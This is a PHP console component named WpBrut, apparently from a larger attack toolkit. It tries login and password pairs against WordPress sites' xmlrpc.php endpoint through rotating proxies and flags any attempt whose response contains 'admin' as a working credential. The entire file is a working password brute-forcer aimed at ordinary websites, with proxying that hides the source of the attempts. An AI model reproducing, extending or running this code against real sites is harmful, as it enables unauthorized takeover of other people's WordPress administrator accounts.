<?php
namespace console\components\wp;

use app\models\Site;
use app\models\Proxy;
use HieuLe\WordpressXmlrpcClient\WordpressClient;
use HieuLe\WordpressXmlrpcClient\Exception\XmlrpcException;

class WpBrut
{
    public function check(Site $site){

        echo $site->ip . ':';
        echo $site->port . ' ' ;
       // die();
        if(empty($site->ip) || empty($site->port)){
            return false;
        }

        $url = $site->https ? 'https://' : 'http://';
        $url = $url . $site->host . '/xmlrpc.php';
        echo $url. ' ';
        $client = new WordpressClient($url, $site->login->login, $site->password->password);
        $client->setProxy([
            'proxy_ip'      => $site->ip,
            'proxy_port'    => $site->port
        ]);
        $result = false;

       /* $client->onError(function ($error, $event) {
            print_r($error);
        });
*/
       echo $site->login->login . ' ' . $site->password->password .'('. $site->password->id.')'. PHP_EOL;
        $r = null;

            try{
                $r = $client->getUsersBlogs();
                print_r($r);

            } catch (XmlrpcException $e){
                if(mb_strpos(mb_strtolower($e->getMessage()), 'incorrect') !== false){
                    echo $e->getMessage() . PHP_EOL;
                    echo ' incorrect ' . PHP_EOL;
                }
            }

        //echo json_encode($r);
        if(mb_strpos(mb_strtolower(json_encode($r)), 'admin') !== false){
            $result = true;
            echo ' Correct ' . PHP_EOL;
        }
        return $result;
    }
}